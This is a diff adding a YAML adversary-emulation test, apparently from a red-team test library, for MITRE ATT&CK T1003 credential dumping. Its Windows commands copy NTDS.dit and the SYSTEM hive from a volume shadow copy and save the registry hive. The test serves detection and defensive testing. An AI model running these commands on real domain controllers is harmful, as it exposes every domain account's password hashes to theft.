@@ -1,0 +1,16 @@
+---
+
+- id: tacmulti-1003-AR07-1v00-200120190844
+  name: Copy NTDS.dit from Volume Shadow Copy
+  description: .      The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy..  .      This test requires steps taken in the test "Create Volume Shadow Copy with NTDS.dit"..      A successful test also requires the export of the SYSTEM Registry hive. .      This test must be executed on a Windows Domain Controller.
+  tactic: multiple
+  technique:
+    attack_id: T1003
+    name: Credential Dumping
+  platforms:
+    windows:
+      cmd:
+        command: |
+          copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Extract\ntds.dit
+          copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Extract\VSC_SYSTEM_HIVE
+          reg save HKLM\SYSTEM C:\Extract\SYSTEM_HIVE
